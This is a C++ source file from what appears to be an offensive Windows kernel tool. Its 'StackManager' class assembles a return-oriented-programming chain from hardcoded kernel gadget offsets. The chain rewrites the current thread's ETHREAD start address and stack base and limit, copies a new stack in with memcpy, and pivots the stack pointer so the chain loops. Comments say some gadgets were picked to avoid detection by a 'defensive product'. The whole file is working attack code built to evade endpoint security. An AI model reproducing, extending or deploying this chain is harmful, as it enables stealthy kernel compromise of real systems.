#include <include/stack/stack_manager.hpp>
#include <include/utils/utils.hpp>
#include <include/globals.hpp>

std::uint64_t* StackManager::GetStackBuffer()
{
	return Stack->data();
}

std::size_t StackManager::GetStackSize()
{
	return Stack->size() * sizeof(std::uint64_t);
}

void StackManager::AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName)
{
	const std::uint64_t GadgetAddress = KernelModuleBase + GadgetOffset;
	std::printf("[+] RSP+0x%x\tGadget %s (0x%p)\n", this->GetStackSize(), GadgetLogName.data(), GadgetAddress);
	Stack->push_back(GadgetAddress);
}

void StackManager::AddValue(const std::uint64_t Value, const std::string_view& ValueLogName)
{
	std::printf("[+] RSP+0x%x\tValue %s (0x%p)\n", this->GetStackSize(), ValueLogName.data(), Value);
	Stack->push_back(Value);
}

void StackManager::AddPadding(const std::size_t PaddingSize)
{
	// TODO: Make this a cyclic func.
	// right now it's just hardcoded.
	for (int i = 0; i < (PaddingSize / sizeof(std::uint64_t)); i++)
		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
}

void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
{
    this->SetRaxRcxRdx(ReadAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);

    this->ReadRaxIntoRax();
    this->MovRaxIntoR9();

    // this gadget can either write into r8 or rdx, depending on the windows version, so we will set both
    // to a valid memory dummy pool so that it writes there. the value of 'rdx' is set in the first line.
    // to better optimize for our stack size without needing to use more gadgets and padding.
    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
}

void StackManager::ReadRaxIntoRax()
{
    this->AddGadget(0x27af45, "mov rax, qword ptr \[rax\]; ret;");
}

void StackManager::PivotToR11()
{
    this->AddGadget(0x533eda, "mov rsp, r11; ret;");
}

void StackManager::MovRaxIntoR9()
{
    // IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
    // this is why we account for it.
    // TODO: Check if the instruction exists, instead of hardcoding the winvers.
    this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
    if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
        this->AddPadding(0x28);
}

void StackManager::SetR8(const std::uint64_t NewR8Value)
{
    // The reason that we don't simply use a 'pop r8; ret;' gadget is described in issue #12.
    // Basically, the stack unwinding can fail and misinterpret the value we pop as a 'ret' address,
    // this could potentially cause a detection with the defensive product.
    this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    this->AddValue(NewR8Value, "new r8 value");
    this->AddPadding(0x28);
}

void StackManager::SetRdx(const std::uint64_t NewRdxValue)
{
    this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x10);
    this->AddValue(NewRdxValue, "new rdx value");
    this->AddPadding(0x8);
}

void StackManager::SetRcxRdx(const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue)
{
    this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddPadding(0x8);
    this->AddValue(NewRcxValue, "new rcx value");
    this->AddValue(NewRdxValue, "new rdx value");
    this->AddPadding(0x8);
}

void StackManager::SetRaxRcxRdx(const std::uint64_t NewRaxValue, const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue)
{
    this->AddGadget(0xbac75c, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    this->AddValue(NewRaxValue, "new rax value");
    this->AddValue(NewRcxValue, "new rcx value");
    this->AddValue(NewRdxValue, "new rdx value");
    this->AddPadding(0x8);
}

void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
{
	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
	// before the rest of our chain.
    this->SetR8(0);
    this->SetRcxRdx(NewValue, 0);
	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");

	// rax = Thread + Offset inside of ETHREAD, which we will write to
    this->AddFunctionCall("PsGetCurrentThread");
    this->SetRcxRdx(FieldOffset, 0);
	this->AddGadget(0x263f08, "add rax, rcx; ret;");
	this->AddGadget(0x2c3607, "mov qword ptr \[rax\], r9; ret;");
}

void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
{
	constexpr std::uint64_t EThreadStartAddressOffset = 0x4e0;
	constexpr std::uint64_t EThreadWin32StartAddressOffset = 0x560;
	this->ModifyThreadField(EThreadStartAddressOffset, NewStartAddress);
	this->ModifyThreadField(EThreadWin32StartAddressOffset, NewStartAddress);
}

void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit)
{
	constexpr std::uint64_t EThreadStackBaseOffset = 0x38;
	constexpr std::uint64_t EThreadStackLimitOffset = 0x30;
	this->ModifyThreadField(EThreadStackBaseOffset, NewStackBase);
	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
}

void StackManager::PivotToNewStack(StackManager& NewStack)
{
    this->AddFunctionCall("PsGetCurrentThread");
    this->SetRcxRdx(0x30, (std::uint64_t)Globals::StackLimitStoreAddress);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");

    // dereference rax, so that rax = stack limit
    this->ReadRaxIntoRax();
    this->AddGadget(0x432d4d, "mov qword ptr \[rdx\], rax; ret;");


    // move rax into rbx to preserve it
    this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
    // read the value of the current stack offset global variable.
    // also set rcx to zero to clear it's higher bits since we later use 'ecx'
    // we also just set rdx to a dummy memory allocation to optimize for stack usage, instead of doing it later on
    this->SetRaxRcxRdx((std::uint64_t)Globals::CurrentStackOffsetAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);
    this->ReadRaxIntoRax();

    // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
    // holds a small value, either 0x2000 or 0x4000 as an offset
    this->AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    // restore the old value of rax into rax from rbx
    this->AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    this->AddPadding(0x20 + 0x8);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");


    // Write our own stack into thread's legitimate stack

    this->MovRaxIntoR9();

    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
    // of the registers to a valid memory dummy pool so that it writes there.
    // rdx is currently being set above, at the start of the function to optimize for stack space usage.
    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");

    this->SetRdx((std::uint64_t)NewStack.StackAllocAddress);
    this->SetR8(NewStack.StackSizeLimit);
    this->AddFunctionCall("memcpy");

    // Grab stack limit
    this->AddFunctionCall("PsGetCurrentThread");
    this->SetRcxRdx(0x30, 0);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");
    // dereference rax, so that rax = stack limit
    this->ReadRaxIntoRax();

    // get the value of the current stack offset global so we add it into rax

    // same code as above - basically just get the value of CurrentStackOffsetAddress
    // and add it to rax. so rax = stacklimit + curr_stack_offset
    this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
    this->SetRaxRcxRdx((std::uint64_t)Globals::CurrentStackOffsetAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);
    this->ReadRaxIntoRax();
    this->AddGadget(0x212fcb, "xchg ecx, eax; ret;");
    this->AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    this->AddPadding(0x20 + 0x8);
    this->AddGadget(0x263f08, "add rax, rcx; ret;");

    // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
    this->MovRaxIntoR9();
    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
    this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
    // r11=rcx
    this->AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr \[rax\]; je 0x......; mov eax, 0xc000000d; ret;");

    // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
    // meaning we will always swap between 0x2000 and 0x4000 per iteration.
    this->SetRaxRcxRdx(0x6000, 0, (std::uint64_t)Globals::CurrentStackOffsetAddress);
    this->AddGadget(0x43d5e8, "xor qword ptr \[rdx\], rax; ret;");

    // perform pivot, rsp=r11
    this->PivotToR11();
}

void StackManager::LoopBack()
{
    this->PivotToNewStack(*this);
}
